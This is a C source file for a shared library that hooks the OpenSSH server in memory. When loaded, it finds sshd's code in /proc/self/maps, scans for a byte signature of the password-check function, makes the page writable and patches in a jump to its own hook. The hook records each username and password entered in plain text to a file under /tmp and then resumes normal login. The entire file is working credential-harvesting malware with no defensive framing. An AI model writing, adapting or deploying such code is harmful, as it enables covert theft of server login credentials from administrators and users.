#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>

char *LOG_LOCATION = "/tmp/sshlog.txt";
char *PASSWORD_LOCATION = "/tmp/sshpasswords.txt";

void passwd_hook(void*, char*);
void *addr = 0x41424344;

// Code to search for in SSHD
const char *search = "\x31\xd2\x48\x3d\x00\x04\x00\x00\x77";

void __attribute__((constructor)) hook(void) {
FILE *fd;
int log;
char buffer[1024];
char *ptr = 0, *end = 0;
char jmphook[] = "\x48\xb8\x48\x47\x46\x45\x44\x43\x42\x41\xff\xe0";
int ret=0;

	// First we need to hunt for our "auth_password" function signature

	// This will be the location where our SSH log will be stored
	log = open(LOG_LOCATION, O_APPEND | O_RDWR | O_CREAT);

	// Open the SSHD maps file and search for the SSHD process address
	fd = fopen("/proc/self/maps", "r");
        while(fgets(buffer, sizeof(buffer), fd)) {
                if (strstr(buffer, "/sshd") && strstr(buffer, "r-x")) {
                        ptr = strtoull(buffer, NULL, 16);
			end = strtoull(strstr(buffer, "-")+1, NULL, 16);
                        break;
                }
        }
	snprintf(buffer, sizeof(buffer), "[*] SSHD process found at %p-%p\n", ptr, end);
	write(log, buffer, strlen(buffer));
        fclose(fd);

	while(ptr < end) {
		if (ptr[0] == 0x31 && memcmp(ptr, search, 9) == 0) {
			break;
		}
		ptr++;
	}
	if ((end - 1) == ptr) {
		snprintf(buffer, sizeof(buffer), "[!] Could not find signature in SSHD process\n");
		write(log, buffer, strlen(buffer));
		return;
	}

	// Step back to the start of the function
	ptr -= 32;

	// Ptr should now point to the start of "auth_password()", so now we can add our hook
	// We first need to update the protection of memory so we can write to this page
	if ((ret = mprotect((void*)(((unsigned long long)ptr / 4096) * 4096), 4096*2, PROT_READ | PROT_WRITE | PROT_EXEC)) == 0) {
		snprintf(buffer, sizeof(buffer), "[*] Memory protection updated for %p\n", ptr);
		write(log, buffer, strlen(buffer));
	} else {
		snprintf(buffer, sizeof(buffer), "[!] Error updating protection for page %p\n", ptr);
		write(log, buffer, strlen(buffer));
		sprintf(buffer, "[!] mprotect() errno was %d\n", errno);
		write(log, buffer, strlen(buffer));
		return;
	}

	addr = ptr + 16;	// This puts us in place for the strlen call 

	// Patch our hook to jump to the "passwd_hook" function below
	*(unsigned long long *)((char*)jmphook+2) = &passwd_hook;
	memcpy(ptr, jmphook, sizeof(jmphook));

	close(log);
}


void passwd_hook(void *arg1, char *password) {
	
	// We want to store our registers for later
	asm("push %rsi\n"
	    "push %rdi\n"
	    "push %rax\n"
	    "push %rbx\n"
	    "push %rcx\n"
	    "push %rdx\n"
	    "push %r8\n"
	    "push %r9\n"
	    "push %r10\n"
	    "push %r11\n"
	    "push %r12\n"
	    "push %rbp\n"
	    "push %rsp\n"
	    );

	char buffer[1024];
	int log = open(PASSWORD_LOCATION, O_CREAT | O_RDWR | O_APPEND);
	snprintf(buffer, sizeof(buffer), "Password entered: [%s] %s\n", *(void **)(arg1 + 32), password);	
	write(log, buffer, strlen(buffer));
	close(log);

	asm("pop %rsp\n"
	    "pop %rbp\n"
	    "pop %r12\n"
	    "pop %r11\n"
	    "pop %r10\n"
	    "pop %r9\n"
	    "pop %r8\n"
	    "pop %rdx\n"
	    "pop %rcx\n"
	    "pop %rbx\n"
	    "pop %rax\n"
	    "pop %rdi\n"
	    "pop %rsi\n"
	    );

	// Recover from this function
	asm("mov %rbp, %rsp\n"
	    "pop %rbp\n"
	   );

	// Now we replace the first 16 bytes of the original function
	asm("push %%r13\n"
	    "push %%r12\n"
	    "push %%rbp\n"
	    "mov %%rsi, %%rbp\n"
	    "push %%rbx\n"
	    "mov %%rdi, %%rbx\n"
	    "sub $8, %%rsp\n"
	    "mov %0, %%rax\n"
	    "jmp *%%rax\n"
	// Finally, we jump back to the function
	:: "r" (addr): "%rax");
}
